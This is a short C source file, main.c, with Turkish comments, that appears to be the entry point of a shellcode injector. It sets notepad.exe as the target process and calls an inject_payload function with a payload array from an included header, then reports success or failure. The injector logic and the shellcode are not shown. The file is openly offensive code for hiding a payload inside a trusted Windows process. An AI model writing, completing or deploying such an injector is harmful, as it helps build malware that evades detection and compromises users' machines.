//main.c

#include <stdio.h> //Giriş/Cıkış işlemleri(ornegin printf) ve standart fonksiyonlar
#include <stdlib.h> //Giriş/Cıkış işlemleri(ornegin printf) ve standart fonksiyonlar
#include "injector.h" //Payload enjeksiyon işlevlerinitanımlayan
#include "payload.h"  // Payload dizisi  ve boyutu bilgisi burada
int main() {
    LPCSTR hedef = "C:\\Windows\\System32\\notepad.exe";  //Enjekte edilecek hedef uygulamanın tam dosya yolu

    if (!inject_payload(hedef, payload, payload_size)) { //Shellcode'u hedef sürece enjekte eder Eger başarısız olursa 1 doner
        printf("[!] Payload enjekte edilemedi.\n");
        return 1;
    }

    printf("[+] Payload başarıyla enjekte edildi.\n");//Eger başarılı ise 0 doner
    return 0;
}
